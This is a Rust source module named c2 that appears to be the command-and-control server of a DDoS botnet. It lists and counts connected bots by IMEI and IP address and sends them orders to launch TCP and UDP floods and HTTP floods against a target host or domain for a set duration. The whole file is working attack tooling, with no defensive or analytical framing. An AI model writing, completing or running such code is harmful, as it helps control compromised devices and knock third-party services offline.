
pub mod c2 {
    use std::io::{Read, Write};
    use std::net::TcpStream;
    use bson::RawDocumentBuf;
    use crate::{BOT_C2_CONNECTION, L4, L7_HTTP, Message};
    use crate::communication::ddos_frequency::*;
    use crate::communication::common_frequency::*;

    pub fn wait_ok_sig(mut stream: &TcpStream, imei: u64) {
        loop {
            let mut buf: [u8; 1024] = [0; 1024];
            match stream.read(&mut buf) {
                Ok(n) => {
                    let m: Message = bson::from_document(
                        RawDocumentBuf::from_bytes(
                            buf[0..n].to_vec()
                        ).unwrap().to_document().unwrap()
                    ).unwrap();
                    if m.imei == imei && m.shellcode == WAIT_OK_SIG {
                        break;
                    }
                }
                Err(_) => break
            }
        }
    }
    pub fn bots(mut stream: &TcpStream, connection: &BOT_C2_CONNECTION) {
        if connection.lock().unwrap().len() == 0 {
            stream.write_all("Empty\n".as_bytes()).unwrap();
            return;
        }
        for (i, conn) in connection.lock().unwrap().iter().enumerate() {
            stream.write_all(
                format!(
                    "{}; {} ({}) \n", i, conn.imei, conn.peer.split(":").collect::<Vec<_>>().get(0).unwrap()
                ).as_bytes()
            ).unwrap();
        }
    }
    pub fn air(mut stream: &TcpStream, imei: u64) {
        let m = Message {
            imei,
            shellcode: SET_AIR_SIG,
        };

        let mut payload: Vec<u8> = vec![];
        bson::to_document(&m).unwrap().to_writer(&mut payload).unwrap();
        stream.write(&payload).unwrap();
    }
    pub fn l4_tcp(mut stream: &TcpStream, imei: u64, host: String, port: u32, duration: u32) {
        let m = Message {
            imei,
            shellcode: L4_TCP_SIG
        };
        let mut payload: Vec<u8> = vec![];
        bson::to_document(&m).unwrap().to_writer(&mut payload).unwrap();
        stream.write(&payload).unwrap();

        wait_ok_sig(&stream, imei);

        let mut l4: Vec<u8> = vec![];
        let l4_tcp = L4 {
            host,
            port,
            duration,
        };
        bson::to_document(&l4_tcp).unwrap().to_writer(&mut l4).unwrap();
        stream.write(&l4).unwrap();
    }
    pub fn l4_udp(mut stream: &TcpStream, imei: u64, host: String, port: u32, duration: u32) {
        let m = Message {
            imei,
            shellcode: L4_UDP_SIG
        };
        let mut payload: Vec<u8> = vec![];
        bson::to_document(&m).unwrap().to_writer(&mut payload).unwrap();
        stream.write(&payload).unwrap();

        wait_ok_sig(&stream, imei);

        let mut l4: Vec<u8> = vec![];
        let l4_udp = L4 {
            host,
            port,
            duration
        };
        bson::to_document(&l4_udp).unwrap().to_writer(&mut l4).unwrap();
        stream.write(&l4).unwrap();

    }
    pub fn l7_http(mut stream: &TcpStream, imei: u64, domain: String, port: u32, duration: u32) {
        let m = Message {
            imei,
            shellcode: L7_HTTP_SIG,
        };
        let mut payload: Vec<u8> = vec![];
        bson::to_document(&m).unwrap().to_writer(&mut payload).unwrap();
        stream.write(&payload).unwrap();

        wait_ok_sig(&stream, imei);

        let mut l7: Vec<u8> = vec![];
        let l7_http = L7_HTTP {
            domain,
            port,
            duration,
        };
        bson::to_document(&l7_http).unwrap().to_writer(&mut l7).unwrap();
        stream.write(&l7).unwrap();

    }
    pub fn count(mut stream: &TcpStream, connection: &BOT_C2_CONNECTION) {
        let count = connection.lock().unwrap().len();
        stream.write_all(
            format!("{}\n", count.to_string().as_str()).as_bytes()
        ).unwrap()
    }


}